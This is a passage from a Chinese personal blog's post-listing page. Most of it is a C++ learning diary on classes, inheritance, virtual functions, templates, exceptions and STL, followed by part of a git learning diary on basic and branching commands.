<p>然后在main.cc的打印节后一部分调用就好了；</p>
<p>通过：</p>
<p><img src="https://s2.loli.net/2022/11/06/v6ESOF5znQ2khu7.png" alt="pass"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>纯粹对今年的有兴趣，5和7都比较新鲜，也是第一次手撸汇编了解bfd库，还挺有意思；</p>
</div></div><a class="button-hover more" href="/SecondBC/2022/11/06/2022-syc-bin%E4%BA%8C%E9%9D%A2/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/10/28/C++%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/">C++学习日记</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-10-28</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Cpp/">Cpp</a></div></div><div class="post-content"><div class="main-content content"><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p><code>namespace NameSpace&#123;&#125;</code>，为解决变量以及函数重名而出现；</p>
<p>只能在全局中声明，可以嵌套，使用<code>NameSpace::Items</code>，调用内容；</p>
<p>可以在函数开头用 <code>using NameSpace::Items</code>，来声明引用内容，或者用 <code>using namespace NameSpace</code>，来声明引用全部内容；</p>
<p>可以匿名，引用内容则为<code>::Items</code>，等效于全局内容；</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>定义的时候就需要赋值：<code>int &amp;ra = a;</code> ，前面加地址符号，意义是使得ra和a共享地址（取个别名）；</p>
<p>数组定义时记得加括号明确计算意义：<code>int (&amp;ra)[10] = a[10]</code> ；</p>
<p>类似指针，函数传参时可以间接影响外部变量，并且返回时不能返回局部变量，因为是一个地址，内容会发生改变；</p>
<h3 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h3><p><code>int &amp;ra = a </code>  等价于 <code>int * const ra = &amp;a</code> ；</p>
<p>目的为了简化源码理解，不需要构造多级指针，传参时传入引用可以体现出改变外部变量的意思；</p>
<h2 id="面向对象与类"><a href="#面向对象与类" class="headerlink" title="面向对象与类"></a>面向对象与类</h2><p>特征：封装，继承，多态；</p>
<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>将一类的函数和数据装在一个类里，设置私有数据域，和公共方法称为<strong>封装</strong>；</p>
<p>结构体等同于类，类里的对象拥有<strong>属性</strong>（数据），<strong>行为</strong>（函数），以及<strong>构造函数</strong>（初始化数据的函数，与类同名无返回）；</p>
<p>初始化定义：声明同时赋值；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造函数后面加冒号变量为初始化，意义在于控制常量</span></span><br><span class="line"><span class="built_in">matrix</span>(<span class="keyword">int</span> input):<span class="built_in">line</span>(input)</span><br></pre></td></tr></table></figure>

<p><strong>析构函数</strong>：与类名同名，前面加~，局部变量返回时自动执行，一般做扫尾工作，如free；</p>
<p>调用类函数的时候，实际上编译器将外部变量的引用（匿名 / this ）传入了类函数中；</p>
<p>定义在类中的函数，可以使用 this 指针，这个指针用于操控类里的变量，防止同名冲突；</p>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>将一个类的内容添加到另一个类的起始；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> same;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span>:</span>Father <span class="comment">//继承</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> same;</span><br><span class="line">    <span class="keyword">int</span> height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> same;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">int</span> same;</span><br><span class="line">    <span class="keyword">int</span> height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过父类引用访问子类，但只能指到age结束，要访问子类后续可以用操作指针；</p>
<p>同样可以通过子类引用访问父类，但需要强制转换，且指针可以访问父类后面的空白区域；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Child ch;</span><br><span class="line">Father *pfa = &amp;ch;</span><br><span class="line">pfa-&gt;age; <span class="comment">//通过父类指针访问继承age；</span></span><br><span class="line">---</span><br><span class="line">Father fa;</span><br><span class="line">Child *pch = (Child *)&amp;fa;</span><br><span class="line">pch-&gt;age; <span class="comment">//通过子类指针访问父类age；</span></span><br></pre></td></tr></table></figure>

<p>若继承里有同名变量，则使用就近原则使用子类的内容；若要访问父类的同名变量，加上父类名：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Child a;</span><br><span class="line">a.same = <span class="number">1</span>; <span class="comment">//改变原子类内容</span></span><br><span class="line">a.Father::same = <span class="number">2</span>; <span class="comment">//改变继承内容</span></span><br></pre></td></tr></table></figure>

<p>C++拥有多继承，按顺序排的类，哪个在前，其内容内存地址继承在最上方；</p>
<p><strong>权限继承：</strong></p>
<p>class修饰默认为private，若以public继承，则父类内容里保持不变（public还是public，private还是private）；</p>
<p>private修饰的内容继承，子类不能访问，但protected可以；（protected和private就只有这个区别）</p>
<p>构造析构函数也会继承；</p>
<h3 id="new-amp-delete"><a href="#new-amp-delete" class="headerlink" title="new&amp;delete"></a>new&amp;delete</h3><p>创建类指针时，在堆开辟类内存空间并执行构造函数： <code>Child *pch = new Child();</code> 类似于java；</p>
<p>使用delete释放空间并执行析构函数： <code>delete pch;</code> ;</p>
<h3 id="拷贝构造函数"><a href="#拷贝构造函数" class="headerlink" title="拷贝构造函数"></a>拷贝构造函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Test::<span class="built_in">Test</span>(Test &amp;testaddr)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用于对象，复制属性时候执行，只是浅拷贝，值转换，指针可能出错；一般对象作为参数和返回值时就会调用；</p>
<h3 id="虚继承"><a href="#虚继承" class="headerlink" title="虚继承"></a>虚继承</h3><p>用于避免多继承的多义变量产生；如：A -&gt; B，A -&gt; C；B,C -&gt; D；使得D里有两组A内容；</p>
<p>继承时，在继承类的前面用 virtual 修饰，称其为<strong>虚基类</strong>；此时，虚基类不会直接继承其内容给子类，而是会给子类一个<strong>虚基类表</strong>，这是一个指针，指向两个数据，第一个表示<strong>虚基类表位于当前所在类</strong>的偏移，第二个表示<strong>继承父类位于虚基类表</strong>的偏移；</p>
<p>一般虚继承的父类内容放在子类内存的下方；</p>
<h3 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h3><p>在类中定义，用 friend 修饰，可以为另类和函数，使其能够直接使用 private 修饰的内容；</p>
<h3 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h3><p>类类型的对象进行运算是没有意义的，所以可以自己给运算符定义意义；</p>
<p>使用以下内容重载运算符 加号,使得当两个对象相加时执行 “+” 函数的语句：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A <span class="keyword">operator</span>+ (A a1, A a2)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>明确一些专有名词：</p>
<ol>
<li>重载：同一类里，同名函数，不同参数表；</li>
<li>重写：不同类，且类有继承关系，同名函数；</li>
<li>静态联编：程序编译时定死函数符号以及类指针的引用；动态联编则相反；</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">HaHa</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;233&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">public</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">HaHa</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;lol&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"><span class="comment">//此为静态联编，当 *p 定为 A 类型时，默认A -&gt; HaHa() 调用 A 类里的函数；则两个都输出 233 ；</span></span><br><span class="line"><span class="comment">//当父类A里函数用 virtual 修饰时为动态联编，两个分别输出 233 和 lol；</span></span><br><span class="line">    </span><br><span class="line">A a;</span><br><span class="line">B b;</span><br><span class="line">A *p = <span class="literal">NULL</span>;</span><br><span class="line">A = &amp;a;</span><br><span class="line">A -&gt; <span class="built_in">HaHa</span>();</span><br><span class="line">A = &amp;b;</span><br><span class="line">A -&gt; <span class="built_in">HaHa</span>();</span><br></pre></td></tr></table></figure>

<p>可以抽象地将函数理解成是存在于类中（实际上并没有），继承后盖在子类头上，一共有两个HaHa函数，就近原则选择父类的函数（父类指针），而虚函数的声明免除了这个误会，就类似于虚继承了；</p>
<p>同一个指针，指向不同对象，展现出不同效果的情况，称其为多态，为了实现多态而不产生歧义，才有的<strong>虚函数</strong>；</p>
<p>定义：一个类中声明了虚函数，但是没给出实现，此称为<strong>纯虚函数</strong>，这个类叫做<strong>抽象类</strong>；抽象类不配有对象；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Q:为什么这么做？</p>
<p>A:用于构造模型，用子类去实现具体内容，并由一个指向父类的指针去实现多个子类的多态；</p>
<p>如果定义了虚函数，则类里会存在虚表指针独占内存，指向<strong>虚表</strong>，虚表里包含各个虚函数的地址；</p>
<p>继承会合并父类虚表为一个，如果是多继承，则合并第一个继承的虚表，后面的会保留下来；</p>
<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>为解决多次重载不同**类型(重点)**参数的函数而出现；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DD&gt;</span></span><br><span class="line"><span class="function">DD <span class="title">func</span><span class="params">(DD a, DD b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用时，直接代入函数就行，DD需同类型，但不能指针；</p>
<p>需要指针时，需要使<strong>模板特化</strong>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//紧跟上面的内容写</span></span><br><span class="line">---</span><br><span class="line"><span class="keyword">template</span>&lt;&gt;</span><br><span class="line"><span class="keyword">int</span> *func&lt;<span class="keyword">int</span> *&gt;(<span class="keyword">int</span> *a, <span class="keyword">int</span>*b)			<span class="comment">//尖括号内容可有可无</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *(a + b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果有重载函数，模板特化，函数模板都满足使用的类型，则优先级由最特化到最不特化；</p>
<p>类也有模板，用 <code>template&lt;class DD&gt;</code> 声明；DD则可替换类里属性的类型；</p>
<p>使用时，用 <code>ClassName&lt;type&gt; a;</code> 来创建一个类对象；</p>
<p><strong>模板的机制：</strong></p>
<p>实际上，模板通过把一个数据类型用通用参数符号来<strong>代替</strong>，实际使用时，用某种数据类型进行替换；</p>
<p>达到处理类型不同，实现功能相同的效果；</p>
<p>模板技术成为<strong>泛型编程</strong>；</p>
<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>三个关键词：</p>
<p><strong>throw</strong> : 手动抛出异常，一般满足if关系式后执行，也一般存在try包括中；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> code;		<span class="comment">//code为之后的捕获catch返回的内容</span></span><br></pre></td></tr></table></figure>

<p><strong>try</strong> 和 <strong>catch</strong> 成对出现，前者会用大括号包住可能出现异常的<strong>语句块</strong>；后者作为函数跟随： <code>catch(type code)</code> , <strong>接收</strong>抛出的code，<strong>并执行</strong>catch函数里的内容；</p>
<p>catch里也能放 <code>...</code> ，意思是捕获<strong>任意类型</strong>(包括类)异常（接收任意类型code）;</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="number">12</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a/b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="built_in">func</span>(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in"><span class="keyword">catch</span></span>(<span class="keyword">int</span> code)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;异常了，且code为&quot;</span> &lt;&lt; code &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码会使得打印catch中的语句，且code值为12；</p>
<h2 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h2><p>标准模板库；</p>
<p>其部件：容器，算法，迭代器；目的是为了更好地存储数据（如排序和查找遍历）</p>
<h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p>顺序容器：</p>
<ul>
<li><p>Vector：向量，动态数组</p>
<p>可扩大数组，每次扩大自身2倍；</p>
<p>用法：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">push_back	<span class="comment">//插入到末尾</span></span><br><span class="line">insert 		<span class="comment">//指定位置插入</span></span><br><span class="line">Pop_back	<span class="comment">//删末尾元素</span></span><br><span class="line">erase		<span class="comment">//删除指定位置</span></span><br><span class="line">Clear		<span class="comment">//清空所有</span></span><br><span class="line">Vec[i]		<span class="comment">//访问索引元素</span></span><br><span class="line">at			<span class="comment">//返回指定下标处元素</span></span><br><span class="line">begin		<span class="comment">//返回 iterator 指向第一个元素</span></span><br><span class="line">End 		<span class="comment">//返回 iterator 指向末尾下一个</span></span><br><span class="line">empty		<span class="comment">//是否为空？</span></span><br><span class="line">size		<span class="comment">//获取元素个数</span></span><br><span class="line">swap		<span class="comment">//交换两个元素</span></span><br><span class="line">  </span><br><span class="line">---</span><br><span class="line">vector&lt;type&gt; item;	<span class="comment">//创建</span></span><br><span class="line">vector::iterator it = item.<span class="built_in">begin</span>();		<span class="comment">//创建迭代器（指针）</span></span><br></pre></td></tr></table></figure></li>
<li><p>String：字符串</p>
</li>
<li><p>List：双向链表</p>
<p>不能操控下标，只能添加和删除以及遍历；</p>
<p>用法和维克托差不多，多了个对头的操作：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Push_front		<span class="comment">//插入头部</span></span><br><span class="line">Pop_front		<span class="comment">//头部删除</span></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">list&lt;type&gt; item;	<span class="comment">//创建</span></span><br><span class="line">list::iterator it = item.<span class="built_in">begin</span>();		<span class="comment">//创建迭代器（指针）</span></span><br></pre></td></tr></table></figure>

<p>若要操作插入，需要创建迭代器，并且用for循环让iterator++,对list而言，迭代器不能直接加一个数；</p>
</li>
<li><p>Deque：双端队列</p>
</li>
</ul>
<p>关联容器：</p>
<ul>
<li><p>Set</p>
</li>
<li><p>Map</p>
<p>类似于python字典，有 key 和 value，其类型位pair；</p>
<p>可以用 <code>map[key] = value</code> 实现赋值；</p>
<p>用法：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">map&lt;<span class="keyword">const</span> <span class="keyword">char</span>*, <span class="keyword">int</span>&gt; item;</span><br><span class="line">item.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&quot;BC&quot;</span>,<span class="number">12</span>));</span><br><span class="line">map::iterator it = item.<span class="built_in">begin</span>();</span><br><span class="line">it -&gt; first <span class="comment">//访问key值</span></span><br><span class="line">it -&gt; second<span class="comment">//访问value值</span></span><br></pre></td></tr></table></figure></li>
<li><p>Multiset</p>
</li>
<li><p>Multimap</p>
</li>
</ul>
<p>容器适配器：</p>
<ul>
<li>Stack</li>
<li>Queue</li>
<li>Prority queue</li>
</ul>
<h2 id="接口的概念"><a href="#接口的概念" class="headerlink" title="接口的概念"></a>接口的概念</h2><p>在<strong>面向对象</strong>的过程中，接口就是公共属性的函数，是类内部私有属性和用户的桥梁；</p>
<p>在<strong>多态</strong>的解释中，接口是抽象类函数，运用这个接口去实现不同子类的多态；</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实际学下来花了接近2个星期吧，说多不多说少不少，要真的掌握和吃牢固还是比较难受；</p>
<p>这么多内容实际上和C的差别也就是编译器，底层展现的代码其实都差不多（比如引用），按java的说法，其实对于这类语言还有更多说法，比如类里定义另类型对象这种<strong>聚集</strong>关系，以及链式异常（两种不同嵌套）；</p>
<h3 id="关于多态的思考"><a href="#关于多态的思考" class="headerlink" title="关于多态的思考"></a>关于多态的思考</h3><p>类型变量实际上也是一个引用，只不过CPP是声明即创建，只不过没赋值，而java是需要声明和创建的；所以导致一个结果：java只需要声明后创建子类类型就能实现多态，而CPP需要创建一个类指针来接收子类引用；</p>
<h3 id="关于类的思考"><a href="#关于类的思考" class="headerlink" title="关于类的思考"></a>关于类的思考</h3><p>STL的思想就很像java，感觉STL在往java和python靠，把一些容器的实现都弄成类，而且是泛型的；但是用之前记得调用头文件和std命名空间；</p>
</div></div><a class="button-hover more" href="/SecondBC/2022/10/28/C++%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/10/11/git%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/">git学习日记</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-10-16</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Git/">Git</a></div></div><div class="post-content"><div class="main-content content"><p>git是分布式版本控制系统；</p>
<h2 id="什么是版本控制系统？"><a href="#什么是版本控制系统？" class="headerlink" title="什么是版本控制系统？"></a>什么是版本控制系统？</h2><p>比如写游戏，会分版本，从一代的基础上复制并修改为二代，一代保留（类似MC的1.7.10和1.19）；</p>
<p>当出了很多个版本之后，<strong>一点</strong>是想要回去玩之前的经典版本，但在版本丛中不好找；第<strong>二点</strong>是两个部门合作一个版本时分工不同，需要对一个共享文件进行改动，但是不知道另一个部门在什么时候做了什么改动，要合并内容，会比较难顶；</p>
<p>而一个软件能解决这些毛病，<strong>记录每次文件的改动，且允许共同编辑</strong>，称其为版本控制系统，目的为了方便开发大项目；</p>
<h2 id="分布式与集中式？"><a href="#分布式与集中式？" class="headerlink" title="分布式与集中式？"></a>分布式与集中式？</h2><p>集中式：版本库集中于中央服务器，每次改动会从其中获取新版本，之后推送回去；</p>
<p>分布式：每个人的文件中都有版本库，所以工作时不需联网，合作时，只需要将改动推送给对方，多人合作时，会有一人充当中央服务器；</p>
<h2 id="Git工作流程"><a href="#Git工作流程" class="headerlink" title="Git工作流程"></a>Git工作流程</h2><p><img src="https://s2.loli.net/2022/10/11/9zTqdhYIPXAW7Ux.png" alt="do"></p>
<p>Workspace：<strong>工作区</strong>，平时存放项目代码的地方。<br>Index / Stage：<strong>暂存区</strong>，用于临时存放你的改动，事实上它只是一个文件，保存即将提交到文件列表信息。<br>Repository：<strong>仓库区</strong>（或本地仓库），就是安全存放数据的位置，这里面有你提交到所有版本的数据。其中HEAD指向最新放入仓库的版本。<br>Remote：<strong>远程仓库</strong>（github） ，托管代码的服务器，可以简单的认为是你项目组中的一台电脑用于远程数据交换。</p>
<p>一个文件夹即可成为工作区，其中初始化后有一个.git后缀子目录，存放Git管理信息；.git里又有暂存区和仓库区；</p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>使文件夹成为工作区：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init (指定目录)</span><br></pre></td></tr></table></figure>



<p>添加文件到暂缓区：(name可以是*.加上后缀名，表示全部的一类后缀名都加入)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add (name)</span><br></pre></td></tr></table></figure>



<p>告知后提交，真正加入仓库中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;初始化项目版本&quot;</span><br></pre></td></tr></table></figure>



<p>查看仓库当前状态，显示有变更的文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure>



<p>回退版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset (place)</span><br></pre></td></tr></table></figure>



<p>从暂缓区和工作区中删除：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm</span><br></pre></td></tr></table></figure>



<p>移动或重命名工作区文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git mv</span><br></pre></td></tr></table></figure>



<h3 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h3><p>控制远程仓库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote (基本操作)</span><br></pre></td></tr></table></figure>



<p>从远程获取代码库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fetch</span><br></pre></td></tr></table></figure>



<p>下载远程代码并合并：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure>



<p>上传远程代码并合并：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure>



<p>撤回：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git revert</span><br></pre></td></tr></table></figure>

<p>实际上是将之前的提交记录的相同状态再提交了一遍；</p>
<h3 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h3><p>创建分支：(不加name则是列出分支)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch (name)</span><br></pre></td></tr></table></figure>

<p>带参：-d，表示delete，删除该分支；</p>
<p>​           -f，强制移动；例如：git branch -f main HEAD~3 将main分支移动到HEAD所指的提交记录上；</p>
<p>切换分支：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout (name)</span><br></pre></td></tr></table></figure>

<p>带参：-b，意思是先branch，再checkout，可以直接切换到新创的分支里；</p>
<p>name是某个具体提交记录那么就会分离HEAD，name如果是分支名加^，就会移到前一个提交记录；</p>
<p>如果是HEAD加~x，就会移动到前x个提交记录；</p>
<p>合并分支：（当前分支上融合另一个，另一个会存在一个副本）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge</span><br></pre></td></tr></table></figure>



<p>合并同一分支上且不留副本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase </span><br></pre></td></tr></table></figure>

<p>带参：-i，交互式rebase；</p>
